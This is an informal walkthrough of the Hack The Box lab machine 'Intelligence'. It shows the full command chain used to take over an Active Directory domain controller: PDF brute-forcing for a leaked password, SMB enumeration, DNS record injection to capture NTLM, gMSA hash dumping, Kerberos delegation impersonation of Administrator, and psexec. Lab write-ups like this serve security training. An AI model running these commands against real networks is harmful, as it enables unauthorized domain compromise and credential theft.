### Intelligence

So, the usual domain controller ports are open

after looking at some usual AD things  for some time, like SMB shares, ASREP roasting, lookupsids.py, none of them seem to have worked

now, lets do a bit of web enum

so the documents that we have on the site have a format on them, so we can try to see if there are more files in those format

`python3 sc.py  > pdflist`

lets bruteforce this with ffuf, we got a bunch of pdf files, out of which, one of them gives us the creds for a molina user

`pdf:tiffany.molina:NewIntelligenceCorpUser9876`

so user is as simple as this, lets have a look at smbmap

`smbmap -H 10.10.10.248 -u 'tiffany.molina' -p 'NewIntelligenceCorpUser9876'`

we have read access on IT and USers (which are the only useful ones), so the Users dir gives us the user flag if we do

`smbmap -H 10.10.10.248 -u 'tiffany.molina' -p 'NewIntelligenceCorpUser9876' -R Users -A user.txt`

R names a share, and A names the files with that name to be picked up

we got some creds, now,

`rpcclient 10.10.10.248 -U 'tiffany.molina'` with her password gives us some flexibility to enumerate

lets save users to users files

we see a script in smb share for tiffany, so the script is basically querying the ADDS database for objects and grepping for a name of web*

`python3 dnstool.py -u intelligence.htb\\tiffany.molina -p NewIntelligenceCorpUser9876 -a add -r webxxx.intelligence.htb -d 10.10.14.77 10.10.10.248`

got the ntlm for ted, and his password

lets do ldapdomaindump, we find the svc_int is allowed to do kerberos deleagtion

if we run 

3d3f5b98dd8e79086165990f2b1707f5
b3a2dc11db1f8b39ae21ac970ed3144a

`python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248`

```
Users or groups who can read password for svc_int$:
> DC$
> itsupport
svc_int$:::47e89a6afd68e3872ef1acaf91d0b2f7
```

this is called Kerberos delegation

`getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 intelligence.htb/svc_int -hashes 47e89a6afd68e3872ef1acaf91d0b2f7:47e89a6afd68e3872ef1acaf91d0b2f7`

the first part of this hash is pretty useless

```
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass -dc-ip 10.10.10.248 intelligence.htb/Administrator@10.10.10.248
```